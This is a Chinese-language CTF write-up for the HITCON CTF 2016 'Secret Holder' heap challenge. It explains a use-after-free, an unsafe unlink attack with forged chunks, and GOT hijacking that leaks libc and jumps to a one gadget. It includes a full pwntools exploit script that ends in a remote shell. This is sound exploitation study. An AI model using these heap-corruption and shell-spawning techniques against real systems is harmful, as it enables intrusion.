---
title: '[HITCON CTF 2016 Quals] Secret Holder 100'
author: bruce30262
tags:
  - pwn
  - heap
  - HITCON CTF 2016
  - Use After Free
  - unsafe unlink
  - smallbin
  - one gadget
  - GOT hijacking
categories:
  - write-ups
date: 2016-10-14 23:52:00
---
## Info  
> Category: pwn
> Point: 100
> Author: bruce30262 @ BambooFox
> 這題是比賽結束後才解出來的 :(

## Analyzing
64 bit ELF, Partial RELRO, 有canary & NX, 沒PIE

程式行為很簡單:

* keep secret: 新增一個 secret ( 使用 calloc )
* wipe secret: 刪除一個 secret
* renew secret: 編輯一個 secret

secret 種類有三種:

* small secret: secret buffer 大小為 40  
* big secret: secret buffer 大小為 4,000 
* huge secret: secret buffer 大小為 400,000 

三個 secret 的 buffer address 都會存在 global 段。

這題的洞主要是在 `wipe` 那邊，在刪除一個 secret 的時候不會檢查 secret 是否存在，因此存在著 Use-After-Free 的情形。例如 keep(small) --> wipe(small) --> keep(big) --> **wipe(small)**，這樣的操作可以製造出 dangling pointer。

比賽當下在解的時候頂多做出 small 和 big buffer overlapped 的情形，但是因為兩者的 base address 位於同樣的位址，因此無法改到 chunk header。此外雖然可以改到 top_size，但是因為 malloc 大小不可控的關係，因此也無法利用 [House of Force](https://github.com/shellphish/how2heap/blob/master/house_of_force.c) 來解這題。當時沒有想到要用 huge 來解題，因為覺得 huge 的 buffer 其 size 過大，必定會使用 `mmap` 來配置記憶體，所以覺得沒有什麼可以利用的點。比賽結束後，經詢問卻發現原來 huge 是這題的關鍵...


## Exploit
關鍵在於，第一次 `keep(huge)` 的時候的確會使用 `mmap` 來配置記憶體，但是將 huge 給 wipe 掉之後，**第二次 `keep(huge)` 時會使用 `malloc` 來進行配置**，而非 `mmap`。因此掌握到這點之後，我們可以透過以下步驟來 exploit 這題:

1. 先透過一連串的 `keep` 和 `wipe`，讓 small 和 huge 的 buffer 位置重疊 ( same base address )。
2. 之後 `keep(big)`，讓 big 的 buffer 位置接在 small 的後面。
3. `renew(huge)`，此時就可以蓋到 big 的 chunk header。我們可以在 big 的 buffer 位置偽造假的 smallbin，並在其附近偽造一些 chunk，之後 `wipe(big)`，做 [unsafe unlink attack](https://github.com/shellphish/how2heap/blob/master/unsafe_unlink.c)，overwrite 掉位於 global data 段上的 buffer address。
4. 假設改掉的是 huge 的 buffer address，之後我們就可以透過 `renew(huge)` 來覆寫掉所有 secret 的 buffer address。
5. 之後我們就可以透過 `renew(small/big/huge)` 來做任意位址讀寫。

(想了解 unsafe unlink 如何 work 的可以參考這兩篇: [link1](http://winesap.logdown.com/posts/258859-0ctf-2015-freenote-write-up), [link2](http://angelboy.logdown.com/posts/259180-0ctf-2015-write-up) )

能做到任意位址讀寫之後基本上就差不多了。因為 GOT 可寫的關係，因此接下來可以利用 GOT hijacking 來 exploit。不過因為這題我們還沒有 leak 的關係，因此要先透過 GOT hijacking 做 leak，之後再控制 control flow 拿 shell。

這裡我的做法是先將 free 改成 puts，並將 small 的 buffer 改成 `__libc_start_main@got.plt`，這樣子在 `free(small)` 的時候就可以 leak libc 的 address。之後再 hijack 任意一個 GOT 跳 [one gadget](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)，即可拿到 shell。

```python exp_secret.py
#!/usr/bin/env python
from pwn import *
import subprocess
import sys
import time

HOST = "52.68.31.117"
PORT = 5566
ELF_PATH = "./secret_holder_noalarm"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def keep(ch, secret):
    r.sendlineafter("3. Renew secret\n", "1")
    r.sendlineafter("3. Huge secret\n", str(ch))
    r.sendafter("secret: \n", secret)

def wipe(ch):
    r.sendlineafter("3. Renew secret\n", "2")
    r.sendlineafter("3. Huge secret\n", str(ch))

def renew(ch, secret):
    r.sendlineafter("3. Renew secret\n", "3")
    r.sendlineafter("3. Huge secret\n", str(ch))
    r.sendafter("secret: \n", secret)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    keep(1, "A"*8)
    keep(2, "A"*8)
    keep(3, "A"*8)
    wipe(1)
    wipe(2)
    wipe(3)

    keep(3, "3"*8) # now huge chunk will use malloc, not mmap!!
    wipe(1)
    keep(1, "A"*8) # now huge = small
    keep(2, "2"*8) # big will adjacent to the end of the small buffer

    # 0x6020a8 stores the huge buffer's address
    fake_fd = 0x6020a8 - 0x18
    fake_bk = 0x6020a8 - 0x10

    # overwrite big's chunk data with fake chunk data for unsafe unlink
    payload = p64(0) + p64(0x21) # fake prev_chunk header
    payload += p64(fake_fd) + p64(fake_bk) # fake fd and bk
    payload += p64(0x20) + p64(0x90) # we are going to free here
    payload += "B"*0x80
    payload += p64(0x90) + p64(0x91) # fake next_chunk header
    payload += "C"*0x80
    payload += p64(0x90) + p64(0x91) # fake next_next_chunk header
    renew(3, payload)
    
    wipe(2) # free big, trigger unsafe unlink

    # now huge_buf will point to global data section
    # renew huge, overwrite small, big & huge buffer address
    payload = "A"*0x10
    payload += p64(0)
    payload += p64(0x6020b0) # &small_buf
    payload += p64(elf.got['free'])
    renew(3, payload)
    
    renew(1, p64(elf.plt['puts'])) # make free(buf) = puts(buf)
    
    # make small_buf = libc_start_main got
    # wipe(small) = puts(small) = puts(got) = leak address
    payload = p64(elf.got['__libc_start_main']) + p32(1)*3
    renew(3, payload)
    wipe(1)
    libc.address += u64(r.recvline().strip().ljust(8, "\x00")) - libc.symbols['__libc_start_main']
    one_gadget = libc.address + 0x4525a
    log.success("libc_base: "+hex(libc.address))
    log.success("one_gadget: "+hex(one_gadget))

    # hijack puts@got.plt, make it jump to one_gadget
    payload = p64(elf.got['puts']) + p32(1)*3
    renew(3, payload)
    renew(1, p64(one_gadget))

    r.interactive()
```

flag: `hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}`

這題學到的教訓是 fuzz 真的要做完整，然後不要太相信自己所學的東西 Q_Q
